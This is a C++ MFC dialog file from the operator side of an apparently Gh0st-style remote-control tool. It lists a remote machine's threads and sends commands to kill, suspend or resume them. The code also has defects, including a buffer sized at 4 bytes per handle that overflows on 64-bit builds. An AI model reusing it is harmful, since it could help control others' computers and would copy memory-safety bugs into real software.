// DlgThreaderManager.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "DlgThreaderManager.h"
#include "afxdialogex.h"

HANDLE ListThreadHandle;

vector<SuspendInfo> _sus;

IMPLEMENT_DYNAMIC(CDlgThreaderManager, CDialog)

CDlgThreaderManager::CDlgThreaderManager(CWnd* pParent, _CIOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(IDD_DIALOG_THREADER_PROCESS_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));

	m_BufferData = (char *)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0));
}

CDlgThreaderManager::~CDlgThreaderManager()
{
}

void CDlgThreaderManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_THREADER_MANAGER_SHOW, m_CListCtrl_Dialog_Threader_Manager_Show);
}


BEGIN_MESSAGE_MAP(CDlgThreaderManager, CDialog)
	ON_COMMAND(ID_BUTTON_MENU_THREADER_MANAGER_REFRESH, &CDlgThreaderManager::OnButtonMenuThreaderManagerRefresh)
	ON_COMMAND(ID_BUTTON_MENU_THREADER_MANAGER_KILL_ONE, &CDlgThreaderManager::OnButtonMenuThreaderManagerKillOne)
	ON_COMMAND(ID_BUTTON_MENU_THREADER_MANAGER_SUSPEND, &CDlgThreaderManager::OnButtonMenuThreaderManagerSuspend)
	ON_COMMAND(ID_BUTTON_MENU_THREADER_MANAGER_RESUME, &CDlgThreaderManager::OnButtonMenuThreaderManagerResume)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_THREADER_MANAGER_SHOW, &CDlgThreaderManager::OnNMRClickListThreaderManagerShow)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CDlgThreaderManager 消息处理程序

BOOL CDlgThreaderManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 获得客户端IP SetWindowText

	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format("\\%s - 远程线程管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);
	//设置对话框上的数据
	LOGFONT Logfont;
	CFont* v2 = m_CListCtrl_Dialog_Threader_Manager_Show.GetFont();
	v2->GetLogFont(&Logfont);
	//调整比例
	Logfont.lfHeight = Logfont.lfHeight*1.3;
	Logfont.lfWeight = Logfont.lfWeight*1.3;
	CFont v3;
	v3.CreateFontIndirect(&Logfont);
	m_CListCtrl_Dialog_Threader_Manager_Show.SetFont(&v3);
	v3.Detach();

	m_CListCtrl_Dialog_Threader_Manager_Show.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	switch (m_BufferData[0])
	{
	case CLIENT_PROCESS_MANAGER_ENUM_THREADER_REPLY:
	{																										  
		m_CListCtrl_Dialog_Threader_Manager_Show.InsertColumn(0, "BasePriority", LVCFMT_CENTER, 100);			
		m_CListCtrl_Dialog_Threader_Manager_Show.InsertColumn(1, "ContextSwitches", LVCFMT_CENTER, 100);			
		m_CListCtrl_Dialog_Threader_Manager_Show.InsertColumn(2, "Priority", LVCFMT_CENTER, 100);			  
		m_CListCtrl_Dialog_Threader_Manager_Show.InsertColumn(3, "ThreadID", LVCFMT_CENTER, 100);			  
		m_CListCtrl_Dialog_Threader_Manager_Show.InsertColumn(0, "ThreadState", LVCFMT_CENTER, 100);			  
		m_CListCtrl_Dialog_Threader_Manager_Show.InsertColumn(1, "WaitReason", LVCFMT_CENTER, 100);			  
		m_CListCtrl_Dialog_Threader_Manager_Show.InsertColumn(2, "WaitTime", LVCFMT_CENTER, 100);			  
		m_CListCtrl_Dialog_Threader_Manager_Show.InsertColumn(3, "ThreadHandle", LVCFMT_CENTER, 100);			

		ShowThreaderList();   //由于第一个发送来的消息后面紧跟着进程的数据所以把数据显示到列表当中\0\0

		break;
	}
	default:
		break;
	}

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CDlgThreaderManager::OnClose()
{
	m_ContextObject->DialogID = 0;
	m_ContextObject->DialogHandle = NULL;
	CancelIo((HANDLE)m_ContextObject->ClientSocket);
	closesocket(m_ContextObject->ClientSocket);
	CDialog::OnClose();
}

void CDlgThreaderManager::WindowHandleIO()
{
	if (m_ContextObject == NULL)
	{
		return;
	}

	switch (m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0)[0])
	{
	case CLIENT_PROCESS_MANAGER_ENUM_THREADER_REPLY:
	{
		ShowThreaderList();
		break;
	}
	case CLIENT_PROCESS_MANAGER_KILL_ONE_REPLY:
	{
		OnButtonMenuThreaderManagerRefresh();
		break;
	}
	case CLIENT_THREADER_MANAGER_SUSPEND_REPLY:
	{
		vector<SuspendInfo>::iterator i;
		for (i = _sus.begin(); i != _sus.end(); i++)
		{
			if (i->ThreadHandle == ListThreadHandle)
			{
				i->SuspendCount++;
			}
		}
		break;
	}

	case CLIENT_THREADER_MANAGER_RESUME_REPLY:
	{
		vector<SuspendInfo>::iterator i;
		for (i = _sus.begin(); i != _sus.end(); i++)
		{
			if (i->ThreadHandle == ListThreadHandle)
			{
				i->SuspendCount--;

			}
		}
		break;
	}
	}
}

void CDlgThreaderManager::ShowThreaderList()
{
	//越过一个字节的数据包类型 指向BasePriority
	char	*BufferData = (char *)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1));

	LONG BasePriority;
	ULONG ContextSwitches;
	KPRIORITY Priority;
	HANDLE    ThreadID;
	ULONG ThreadState;
	ULONG WaitReason;
	ULONG WaitTime;
	PVOID   Teb;
	PVOID   ThreadStartAddress;
	HANDLE  ThreadHandle;

	DWORD	Offset = 0;//偏移

					   //清空List列表
	m_CListCtrl_Dialog_Threader_Manager_Show.DeleteAllItems();

	int i;
	SuspendInfo Info = { 0 };
	for (i = 0; Offset < m_ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength() - 1; i++)
	{
		LONG* BasePriority = (LONG*)(BufferData + Offset);      //这里得到BasePriority
		ULONG* ContextSwitches = (ULONG*)(BufferData + Offset + sizeof(LONG));
		KPRIORITY* Priority = (KPRIORITY*)(BufferData + Offset + sizeof(LONG) + sizeof(ULONG));
		HANDLE* ThreadID = (HANDLE*)(BufferData + Offset + sizeof(LONG) + sizeof(ULONG) + sizeof(KPRIORITY));
		ULONG* ThreadState = (ULONG*)(BufferData + Offset + sizeof(LONG) + sizeof(ULONG) + sizeof(KPRIORITY) + sizeof(HANDLE));
		ULONG* WaitReason = (ULONG*)(BufferData + Offset + sizeof(LONG) + sizeof(ULONG) + sizeof(KPRIORITY) + sizeof(HANDLE)
			+ sizeof(ULONG));
		ULONG* WaitTime = (ULONG*)(BufferData + Offset + sizeof(LONG) + sizeof(ULONG) + sizeof(KPRIORITY) + sizeof(HANDLE)
			+ sizeof(ULONG) * 2);
		HANDLE* ThreadHandle = (HANDLE*)(BufferData + Offset + sizeof(LONG) + sizeof(ULONG) + sizeof(KPRIORITY) + sizeof(HANDLE)
			+ sizeof(ULONG) * 3);

		Info.ThreadHandle = *ThreadHandle;
		_sus.push_back(Info);

		CString v1;
		v1.Format("%5u", *BasePriority);
		m_CListCtrl_Dialog_Threader_Manager_Show.InsertItem(i, v1);
		v1.Format("%5u", *ContextSwitches);
		m_CListCtrl_Dialog_Threader_Manager_Show.SetItemText(i, 1, v1);
		v1.Format("%5u", *Priority);
		m_CListCtrl_Dialog_Threader_Manager_Show.SetItemText(i, 2, v1);
		v1.Format("%5u", *ThreadID);
		m_CListCtrl_Dialog_Threader_Manager_Show.SetItemText(i, 3, v1);
		v1.Format("%5u", *ThreadState);
		m_CListCtrl_Dialog_Threader_Manager_Show.SetItemText(i, 4, v1);
		v1.Format("%5u", *WaitReason);
		m_CListCtrl_Dialog_Threader_Manager_Show.SetItemText(i, 5, v1);
		v1.Format("%5u", *WaitTime);
		m_CListCtrl_Dialog_Threader_Manager_Show.SetItemText(i, 6, v1);
		v1.Format("%5u", *ThreadHandle);
		m_CListCtrl_Dialog_Threader_Manager_Show.SetItemText(i, 7, v1);
		// ItemData 为进程ID
		m_CListCtrl_Dialog_Threader_Manager_Show.SetItemData(i, (DWORD_PTR)*ThreadHandle);   //线程句柄 设置Hide
																  
		Offset += sizeof(LONG) + sizeof(ULONG) + sizeof(KPRIORITY) + sizeof(HANDLE) * 2  //跳过这个数据结构 进入下一个循环
			+ sizeof(ULONG) * 3;
	}
}

void CDlgThreaderManager::OnNMRClickListThreaderManagerShow(NMHDR *pNMHDR, LRESULT *pResult)
{
	CString strS;
	CString strR;
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	int Index = m_CListCtrl_Dialog_Threader_Manager_Show.GetSelectionMark();
	if (Index == -1)
	{
		return;
	}
	else
	{

		CMenu Menu;
		Menu.LoadMenu(IDR_MENU_THREADER_MANAGER_LIST_RINGHT);

		ListThreadHandle = (HANDLE)m_CListCtrl_Dialog_Threader_Manager_Show.GetItemData(Index);
		vector<SuspendInfo>::iterator i;
		for (i = _sus.begin(); i != _sus.end(); i++)
		{
			if (i->ThreadHandle == ListThreadHandle)
			{
				strS.Format("挂起线程(%d)", i->SuspendCount);
				strR.Format("恢复线程(%d)", i->SuspendCount);
				//更改菜单项
				Menu.ModifyMenu(ID_BUTTON_MENU_THREADER_MANAGER_SUSPEND, MF_BYCOMMAND | 
					MF_STRING, ID_BUTTON_MENU_THREADER_MANAGER_SUSPEND, strS);
				Menu.ModifyMenu(ID_BUTTON_MENU_THREADER_MANAGER_RESUME, MF_BYCOMMAND | 
					MF_STRING, ID_BUTTON_MENU_THREADER_MANAGER_RESUME, strR);
			}
		}
		CPoint Point;
		GetCursorPos(&Point);
		SetForegroundWindow();
		Menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON | TPM_RIGHTBUTTON, Point.x, Point.y, this, NULL);
	}
	*pResult = 0;
}

void CDlgThreaderManager::OnButtonMenuThreaderManagerRefresh()
{
	// TODO: 在此添加命令处理程序代码
	BYTE IsToken = CLIENT_THREADER_MANAGER_REFRESH;
	m_IOCPServer->OnPrepareSending(m_ContextObject, &IsToken, 1);

}

void CDlgThreaderManager::OnButtonMenuThreaderManagerKillOne()
{
	// TODO: 在此添加命令处理程序代码
	ClientThreaderKill();
}

void CDlgThreaderManager::ClientThreaderKill()
{
	CListCtrl	*v1 = NULL;
	if (m_CListCtrl_Dialog_Threader_Manager_Show.IsWindowVisible())
	{
		v1 = &m_CListCtrl_Dialog_Threader_Manager_Show;
	}
	else
	{
		return;
	}
	//[消息][ID][ID][ID][ID]
	//非配缓冲区
	LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, 1 + (v1->GetSelectedCount() * 4));//1.exe  4  ID   Handle
																				   //加入结束进程的数据头
	BufferData[0] = CLIENT_THREADER_MANAGER_KILL_ONE;

	//显示警告信息
	char *WARNING = "警告: 终止线程可能会导致进程崩溃\n";

	CString v2;
	if (v1->GetSelectedCount() > 1)
	{
		v2.Format("%s确实\n想终止这%d项线程吗?", WARNING, v1->GetSelectedCount());
	}
	else
	{
		v2.Format("%s确实\n想终止该项线程吗?", WARNING);
	}
	if (::MessageBox(m_hWnd, v2, "线程结束警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;


	DWORD	Offset = 1;
	//获取第一个选定项的位置列表视图控件。
	POSITION Pos = v1->GetFirstSelectedItemPosition();
	//得到要结束哪个进程
	//可以一下结束多个进程
	while (Pos)
	{
		int	iItem = v1->GetNextSelectedItem(Pos);
		DWORD ThreadHandle = v1->GetItemData(iItem);
		memcpy(BufferData + Offset, &ThreadHandle, sizeof(HANDLE));
		Offset += sizeof(HANDLE);
	}
	//发送数据到被控端在被控端中查找CLIENT_PROCESS_MANAGER_KILL_ONE这个数据头
	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, LocalSize(BufferData));
	LocalFree(BufferData);
}

void CDlgThreaderManager::OnButtonMenuThreaderManagerSuspend()
{
	// TODO: 在此添加命令处理程序代码
	CListCtrl	*v1 = NULL;
	if (m_CListCtrl_Dialog_Threader_Manager_Show.IsWindowVisible())
	{
		v1 = &m_CListCtrl_Dialog_Threader_Manager_Show;
	}
	else
	{
		return;
	}

	//[消息][ID][ID][ID][ID]
	//非配缓冲区
	LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, 1 + (v1->GetSelectedCount() * 4));//1.exe  4  ID   Handle
																				   //加入结束进程的数据头
	BufferData[0] = CLIENT_THREADER_MANAGER_SUSPEND;

	//显示警告信息
	char *WARNING = "警告: 挂起线程可能会导致线程中止\n甚至进程崩溃\n No Zhuo No Die!";

	CString v2;
	if (v1->GetSelectedCount() > 1)
	{
		v2.Format("%s确实\n想挂起这%d项线程吗?", WARNING, v1->GetSelectedCount());
	}
	else
	{
		v2.Format("%s确实\n想挂起该项线程吗?", WARNING);
	}
	if (::MessageBox(m_hWnd, v2, "线程挂起警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;


	DWORD	Offset = 1;
	//获取第一个选定项的位置列表视图控件。
	POSITION Pos = v1->GetFirstSelectedItemPosition();
	//得到要结束哪个进程
	//可以一下结束多个进程
	while (Pos)
	{
		int	iItem = v1->GetNextSelectedItem(Pos);
		DWORD ThreadHandle = v1->GetItemData(iItem);
		memcpy(BufferData + Offset, &ThreadHandle, sizeof(HANDLE));
		Offset += sizeof(HANDLE);
	}
	//发送数据到被控端在被控端中查找CLIENT_PROCESS_MANAGER_KILL_ONE这个数据头
	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, LocalSize(BufferData));
	LocalFree(BufferData);
}

void CDlgThreaderManager::OnButtonMenuThreaderManagerResume()
{
	// TODO: 在此添加命令处理程序代码
	CListCtrl	*v1 = NULL;
	if (m_CListCtrl_Dialog_Threader_Manager_Show.IsWindowVisible())
	{
		v1 = &m_CListCtrl_Dialog_Threader_Manager_Show;
	}
	else
	{
		return;
	}
	//[消息][ID][ID][ID][ID]
	//非配缓冲区
	LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, 1 + (v1->GetSelectedCount() * 4));//1.exe  4  ID   Handle
																				   //加入结束进程的数据头
	BufferData[0] = CLIENT_THREADER_MANAGER_RESUME;


	DWORD	Offset = 1;
	//获取第一个选定项的位置列表视图控件。
	POSITION Pos = v1->GetFirstSelectedItemPosition();
	//得到要结束哪个进程
	//可以一下结束多个进程
	while (Pos)
	{
		int	iItem = v1->GetNextSelectedItem(Pos);
		DWORD ThreadHandle = v1->GetItemData(iItem);
		memcpy(BufferData + Offset, &ThreadHandle, sizeof(HANDLE));
		Offset += sizeof(HANDLE);
	}
	//发送数据到被控端在被控端中查找CLIENT_PROCESS_MANAGER_KILL_ONE这个数据头
	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, LocalSize(BufferData));
	LocalFree(BufferData);
}


